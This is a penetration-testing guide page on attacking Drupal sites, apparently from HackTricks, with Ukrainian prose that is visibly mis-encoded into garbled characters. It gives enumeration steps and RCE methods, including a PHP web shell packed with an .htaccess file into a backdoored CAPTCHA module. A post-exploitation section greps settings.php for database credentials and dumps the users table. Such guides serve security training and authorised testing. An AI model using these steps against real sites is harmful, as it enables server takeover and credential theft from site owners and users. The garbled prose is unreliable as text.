# Drupal

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) **—ñ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub**.

</details>

## –í—ñ–¥–∫—Ä–∏—Ç—Ç—è

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ **–º–µ—Ç–∞**
```bash
curl https://www.drupal.org/ | grep 'content="Drupal'
```
* **–í—É–∑–æ–ª**: Drupal **—ñ–Ω–¥–µ–∫—Å—É—î —Å–≤—ñ–π –≤–º—ñ—Å—Ç –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –≤—É–∑–ª—ñ–≤**. –í—É–∑–æ–ª –º–æ–∂–µ **–º—ñ—Å—Ç–∏—Ç–∏ –±—É–¥—å-—â–æ**, —Ç–∞–∫–µ —è–∫ –±–ª–æ–≥–æ–≤–∏–π –ø–æ—Å—Ç, –æ–ø–∏—Ç—É–≤–∞–Ω–Ω—è, —Å—Ç–∞—Ç—Ç—è —ñ —Ç. –¥. URI —Å—Ç–æ—Ä—ñ–Ω–æ–∫ –∑–∞–∑–≤–∏—á–∞–π –º–∞—é—Ç—å —Ñ–æ—Ä–º—É `/node/<—ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä_–≤—É–∑–ª–∞>`.
```bash
curl drupal-site.com/node/1
```
## –ü–µ—Ä–µ–ª—ñ–∫

Drupal –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –ø—ñ–¥—Ç—Ä–∏–º—É—î **—Ç—Ä–∏ —Ç–∏–ø–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤**:

1. **`–ê–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä`**: –¶–µ–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –º–∞—î –ø–æ–≤–Ω–∏–π –∫–æ–Ω—Ç—Ä–æ–ª—å –Ω–∞–¥ –≤–µ–±-—Å–∞–π—Ç–æ–º Drupal.
2. **`–ê–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á`**: –¶—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ –º–æ–∂—É—Ç—å —É–≤—ñ–π—Ç–∏ –Ω–∞ –≤–µ–±-—Å–∞–π—Ç —Ç–∞ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –æ–ø–µ—Ä–∞—Ü—ñ—ó, —Ç–∞–∫—ñ —è–∫ –¥–æ–¥–∞–≤–∞–Ω–Ω—è —Ç–∞ —Ä–µ–¥–∞–≥—É–≤–∞–Ω–Ω—è —Å—Ç–∞—Ç–µ–π –Ω–∞ –ø—ñ–¥—Å—Ç–∞–≤—ñ —ó—Ö –¥–æ–∑–≤–æ–ª—ñ–≤.
3. **`–ê–Ω–æ–Ω—ñ–º–Ω–∏–π`**: –£—Å—ñ –≤—ñ–¥–≤—ñ–¥—É–≤–∞—á—ñ –≤–µ–±-—Å–∞–π—Ç—É –º–∞—é—Ç—å —Å—Ç–∞—Ç—É—Å –∞–Ω–æ–Ω—ñ–º–Ω–∏—Ö. –ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º —Ü–∏–º –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º –¥–æ–∑–≤–æ–ª–µ–Ω–æ –ª–∏—à–µ —á–∏—Ç–∞—Ç–∏ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è.

### –í–µ—Ä—Å—ñ—è

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ `/CHANGELOG.txt`
```bash
curl -s http://drupal-site.local/CHANGELOG.txt | grep -m2 ""

Drupal 7.57, 2018-02-21
```
{% hint style="info" %}
–ù–æ–≤—ñ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ Drupal –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –±–ª–æ–∫—É—é—Ç—å –¥–æ—Å—Ç—É–ø –¥–æ —Ñ–∞–π–ª—ñ–≤ `CHANGELOG.txt` —Ç–∞ `README.txt`.
{% endhint %}

### –ü–µ—Ä–µ–ª—ñ–∫ —ñ–º–µ–Ω –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤

#### –†–µ—î—Å—Ç—Ä–∞—Ü—ñ—è

–£ _/user/register_ –ø—Ä–æ—Å—Ç–æ —Å–ø—Ä–æ–±—É–π—Ç–µ —Å—Ç–≤–æ—Ä–∏—Ç–∏ —ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, —ñ —è–∫—â–æ —ñ–º'—è –≤–∂–µ –∑–∞–π–Ω—è—Ç–µ, –≤–∞—Å –ø—Ä–æ—ñ–Ω—Ñ–æ—Ä–º—É—é—Ç—å:

![](<../../.gitbook/assets/image (254).png>)

#### –ó–∞–ø–∏—Ç –Ω–æ–≤–æ–≥–æ –ø–∞—Ä–æ–ª—è

–Ø–∫—â–æ –≤–∏ –∑–∞–ø–∏—Ç—É—î—Ç–µ –Ω–æ–≤–∏–π –ø–∞—Ä–æ–ª—å –¥–ª—è —ñ—Å–Ω—É—é—á–æ–≥–æ —ñ–º–µ–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞:

![](<../../.gitbook/assets/image (255).png>)

–Ø–∫—â–æ –≤–∏ –∑–∞–ø–∏—Ç—É—î—Ç–µ –Ω–æ–≤–∏–π –ø–∞—Ä–æ–ª—å –¥–ª—è –Ω–µ—ñ—Å–Ω—É—é—á–æ–≥–æ —ñ–º–µ–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞:

![](<../../.gitbook/assets/image (256).png>)

### –û—Ç—Ä–∏–º–∞–Ω–Ω—è –∫—ñ–ª—å–∫–æ—Å—Ç—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤

–ó–≤–µ—Ä—Ç–∞—é—á–∏—Å—å –¥–æ _/user/\<number>_, –≤–∏ –º–æ–∂–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –∫—ñ–ª—å–∫—ñ—Å—Ç—å —ñ—Å–Ω—É—é—á–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, —É —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É —Ü–µ 2, –æ—Å–∫—ñ–ª—å–∫–∏ _/users/3_ –ø–æ–≤–µ—Ä—Ç–∞—î –ø–æ–º–∏–ª–∫—É "–Ω–µ –∑–Ω–∞–π–¥–µ–Ω–æ":

![](<../../.gitbook/assets/image (257).png>)

![](<../../.gitbook/assets/image (227) (1) (1).png>)

### –ü—Ä–∏—Ö–æ–≤–∞–Ω—ñ —Å—Ç–æ—Ä—ñ–Ω–∫–∏

**Fuzz `/node/$`, –¥–µ `$` - —Ü–µ —á–∏—Å–ª–æ** (–≤—ñ–¥ 1 –¥–æ 500, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥).\
–í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ **–ø—Ä–∏—Ö–æ–≤–∞–Ω—ñ —Å—Ç–æ—Ä—ñ–Ω–∫–∏** (—Ç–µ—Å—Ç–æ–≤—ñ, —Ä–æ–∑—Ä–æ–±–Ω–∏—Ü—å–∫—ñ), —è–∫—ñ –Ω–µ –≤–∫–∞–∑–∞–Ω—ñ –ø–æ—à—É–∫–æ–≤–∏–º–∏ —Å–∏—Å—Ç–µ–º–∞–º–∏.

#### –Ü–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –ø—Ä–æ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ñ –º–æ–¥—É–ª—ñ
```bash
#From https://twitter.com/intigriti/status/1439192489093644292/photo/1
#Get info on installed modules
curl https://example.com/config/sync/core.extension.yml
curl https://example.com/core/core.services.yml

# Download content from files exposed in the previous step
curl https://example.com/config/sync/swiftmailer.transport.yml
```
### –ê–≤—Ç–æ–º–∞—Ç–∏—á–Ω–∏–π
```bash
droopescan scan drupal -u http://drupal-site.local
```
## RCE

### –ó –º–æ–¥—É–ª–µ–º PHP Filter

{% hint style="warning" %}
–£ —Å—Ç–∞—Ä—ñ—à–∏—Ö –≤–µ—Ä—Å—ñ—è—Ö Drupal **(–¥–æ –≤–µ—Ä—Å—ñ—ó 8)** –±—É–ª–æ –º–æ–∂–ª–∏–≤–æ —É–≤—ñ–π—Ç–∏ —è–∫ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä —Ç–∞ **—É–≤—ñ–º–∫–Ω—É—Ç–∏ –º–æ–¥—É–ª—å `PHP filter`**, —è–∫–∏–π "–î–æ–∑–≤–æ–ª—è—î –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –≤–±—É–¥–æ–≤–∞–Ω–∏–π PHP-–∫–æ–¥/—Ñ—Ä–∞–≥–º–µ–Ω—Ç–∏."
{% endhint %}

–í–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ, —â–æ–± **–ø–ª–∞–≥—ñ–Ω php –±—É–≤ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–π** (–ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ —Ü–µ, –∑–≤–µ—Ä–Ω—É–≤—à–∏—Å—å –¥–æ _/modules/php_ —ñ —è–∫—â–æ –ø–æ–≤–µ—Ä—Ç–∞—î **403**, —Ç–æ **—ñ—Å–Ω—É—î**, —è–∫—â–æ **–Ω–µ –∑–Ω–∞–π–¥–µ–Ω–æ**, —Ç–æ **–ø–ª–∞–≥—ñ–Ω php –Ω–µ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–π**)

–ü–µ—Ä–µ–π–¥—ñ—Ç—å –¥–æ _Modules_ -> (**–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ**) _PHP Filter_ -> _Save configuration_

![](<../../.gitbook/assets/image (247) (1).png>)

–ü–æ—Ç—ñ–º –∫–ª–∞—Ü–Ω—ñ—Ç—å –Ω–∞ _Add content_ -> –í–∏–±–µ—Ä—ñ—Ç—å _Basic Page_ –∞–±–æ _Article -_> –ù–∞–ø–∏—à—ñ—Ç—å _php shellcode —É —Ç—ñ–ª—ñ_ -> –í–∏–±–µ—Ä—ñ—Ç—å _PHP code_ —É _Text format_ -> –í–∏–±–µ—Ä—ñ—Ç—å _Preview_

![](<../../.gitbook/assets/image (253) (1).png>)

–ù–∞—Ä–µ—à—Ç—ñ, –ø—Ä–æ—Å—Ç–æ –∑–≤–µ—Ä–Ω—ñ—Ç—å—Å—è –¥–æ –Ω–æ–≤–æ—Å—Ç–≤–æ—Ä–µ–Ω–æ–≥–æ –≤—É–∑–ª–∞:
```bash
curl http://drupal-site.local/node/3
```
### –í—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –º–æ–¥—É–ª—è PHP Filter

–ü–æ—á–∏–Ω–∞—é—á–∏ –∑ –≤–µ—Ä—Å—ñ—ó **8 —ñ –≤–∏—â–µ**, [**–º–æ–¥—É–ª—å PHP Filter**](https://www.drupal.org/project/php/releases/8.x-1.1) **–Ω–µ –≤—Å—Ç–∞–Ω–æ–≤–ª—é—î—Ç—å—Å—è –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º**. –î–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ü—ñ—î—ó —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω–æ—Å—Ç—ñ –Ω–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ **–≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –º–æ–¥—É–ª—å —Å–∞–º–æ—Å—Ç—ñ–π–Ω–æ**.

1. –ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ –Ω–∞–π–Ω–æ–≤—ñ—à—É –≤–µ—Ä—Å—ñ—é –º–æ–¥—É–ª—è –∑ –≤–µ–±-—Å–∞–π—Ç—É Drupal.
1. wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
2. –ü—ñ—Å–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –ø–µ—Ä–µ–π–¥—ñ—Ç—å –¥–æ **`–ê–¥–º—ñ–Ω—ñ—Å—Ç—Ä—É–≤–∞–Ω–Ω—è`** > **`–ó–≤—ñ—Ç–∏`** > **`–î–æ—Å—Ç—É–ø–Ω—ñ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è`**.
3. –ö–ª–∞—Ü–Ω—ñ—Ç—å –Ω–∞ **`–û–≥–ª—è–¥`**, –≤–∏–±–µ—Ä—ñ—Ç—å —Ñ–∞–π–ª –∑ –∫–∞—Ç–∞–ª–æ–≥—É, –∫—É–¥–∏ –º–∏ –π–æ–≥–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏–ª–∏, –∞ –ø–æ—Ç—ñ–º –∫–ª–∞—Ü–Ω—ñ—Ç—å **`–í—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏`**.
4. –ü—ñ—Å–ª—è –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –º–æ–¥—É–ª—è –º–∏ –º–æ–∂–µ–º–æ –∫–ª–∞—Ü–Ω—É—Ç–∏ –Ω–∞ **`–í–º—ñ—Å—Ç`** —Ç–∞ **—Å—Ç–≤–æ—Ä–∏—Ç–∏ –Ω–æ–≤—É –±–∞–∑–æ–≤—É —Å—Ç–æ—Ä—ñ–Ω–∫—É**, —Å—Ö–æ–∂—É –Ω–∞ —Ç–µ, —â–æ –º–∏ —Ä–æ–±–∏–ª–∏ –≤ –ø—Ä–∏–∫–ª–∞–¥—ñ –¥–ª—è Drupal 7. –ó–Ω–æ–≤—É –ø–µ—Ä–µ–∫–æ–Ω–∞–π—Ç–µ—Å—è, —â–æ –≤–∏ **–≤–∏–±—Ä–∞–ª–∏ `PHP code` –∑—ñ —Å–ø–∏—Å–∫—É `–§–æ—Ä–º–∞—Ç —Ç–µ–∫—Å—Ç—É`**.

### –ú–æ–¥—É–ª—å –∑ backdoor

–ú–æ–¥—É–ª—å –∑ backdoor –º–æ–∂–Ω–∞ —Å—Ç–≤–æ—Ä–∏—Ç–∏, **–¥–æ–¥–∞–≤—à–∏ –æ–±–æ–ª–æ–Ω–∫—É –¥–æ —ñ—Å–Ω—É—é—á–æ–≥–æ –º–æ–¥—É–ª—è**. –ú–æ–¥—É–ª—ñ –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ –Ω–∞ –≤–µ–±-—Å–∞–π—Ç—ñ drupal.org. –î–∞–≤–∞–π—Ç–µ –≤–∏–±–µ—Ä–µ–º–æ –º–æ–¥—É–ª—å, —Ç–∞–∫–∏–π —è–∫ [CAPTCHA](https://www.drupal.org/project/captcha). –ü—Ä–æ–∫—Ä—É—Ç—ñ—Ç—å –≤–Ω–∏–∑ —ñ —Å–∫–æ–ø—ñ—é–π—Ç–µ –ø–æ—Å–∏–ª–∞–Ω–Ω—è –Ω–∞ tar.gz [–∞—Ä—Ö—ñ–≤](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz).

* –ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ –∞—Ä—Ö—ñ–≤ —Ç–∞ —Ä–æ–∑–ø–∞–∫—É–π—Ç–µ –π–æ–≥–æ –≤–º—ñ—Å—Ç.
```
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```
* –°—Ç–≤–æ—Ä—ñ—Ç—å **PHP –≤–µ–±-–æ–±–æ–ª–æ–Ω–∫—É** –∑ —Ç–∞–∫–∏–º –≤–º—ñ—Å—Ç–æ–º:
```php
<?php
system($_GET["cmd"]);
?>
```
* –î–∞–ª—ñ –Ω–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ —Å—Ç–≤–æ—Ä–∏—Ç–∏ —Ñ–∞–π–ª **`.htaccess`**, —â–æ–± –Ω–∞–¥–∞—Ç–∏ —Å–æ–±—ñ –¥–æ—Å—Ç—É–ø –¥–æ –ø–∞–ø–∫–∏. –¶–µ –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ, –æ—Å–∫—ñ–ª—å–∫–∏ Drupal –≤—ñ–¥–º–æ–≤–ª—è—î —É –ø—Ä—è–º–æ–º—É –¥–æ—Å—Ç—É–ø—ñ –¥–æ –ø–∞–ø–∫–∏ **`/modules`**.
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
* –ö–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—è –≤–∏—â–µ –∑–∞—Å—Ç–æ—Å—É—î –ø—Ä–∞–≤–∏–ª–∞ –¥–ª—è –ø–∞–ø–∫–∏ / –ø—Ä–∏ –∑–∞–ø–∏—Ç—ñ —Ñ–∞–π–ª—É –≤ /modules. –°–∫–æ–ø—ñ—é–π—Ç–µ –æ–±–∏–¥–≤–∞ —Ü–∏—Ö —Ñ–∞–π–ª–∏ –≤ –ø–∞–ø–∫—É captcha —Ç–∞ —Å—Ç–≤–æ—Ä—ñ—Ç—å –∞—Ä—Ö—ñ–≤.
```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```
* –ü—Ä–∏–ø—É—Å–∫–∞—é—á–∏, —â–æ —É –Ω–∞—Å —î **–∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–∏–≤–Ω–∏–π –¥–æ—Å—Ç—É–ø** –¥–æ –≤–µ–±-—Å–∞–π—Ç—É, –∫–ª–∞—Ü–Ω—ñ—Ç—å –Ω–∞ **`–ö–µ—Ä—É–≤–∞–Ω–Ω—è`**, –∞ –ø–æ—Ç—ñ–º –Ω–∞ **`–†–æ–∑—à–∏—Ä–µ–Ω–Ω—è`** —É –±—ñ—á–Ω—ñ–π –ø–∞–Ω–µ–ª—ñ. –î–∞–ª—ñ –∫–ª–∞—Ü–Ω—ñ—Ç—å –Ω–∞ –∫–Ω–æ–ø–∫—É **`+ –í—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –Ω–æ–≤–∏–π –º–æ–¥—É–ª—å`**, —ñ –º–∏ –±—É–¥–µ–º–æ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω—ñ –Ω–∞ —Å—Ç–æ—Ä—ñ–Ω–∫—É –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è, —Ç–∞–∫—É —è–∫ `http://drupal-site.local/admin/modules/install`. –ü–µ—Ä–µ–π–¥—ñ—Ç—å –¥–æ –∞—Ä—Ö—ñ–≤—É –∑ backdoored Captcha —Ç–∞ –∫–ª–∞—Ü–Ω—ñ—Ç—å **`–í—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏`**.
* –ü—ñ—Å–ª—è —É—Å–ø—ñ—à–Ω–æ—ó —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –ø–µ—Ä–µ–π–¥—ñ—Ç—å –¥–æ **`/modules/captcha/shell.php`**, —â–æ–± –≤–∏–∫–æ–Ω–∞—Ç–∏ –∫–æ–º–∞–Ω–¥–∏.

## –ü—ñ—Å–ª—è–µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ–π–Ω–∏–π –µ—Ç–∞–ø

### –ü—Ä–æ—á–∏—Ç–∞–π—Ç–µ settings.php
```
find / -name settings.php -exec grep "drupal_hash_salt\|'database'\|'username'\|'password'\|'host'\|'port'\|'driver'\|'prefix'" {} \; 2>/dev/null
```
### –í–∏—Ç—è–≥–Ω—É—Ç–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –∑ –ë–î
```
mysql -u drupaluser --password='2r9u8hu23t532erew' -e 'use drupal; select * from users'
```
## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://academy.hackthebox.com/module/113/section/1209](https://academy.hackthebox.com/module/113/section/1209)

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∞—Ç–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) **—ñ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub**.

</details>
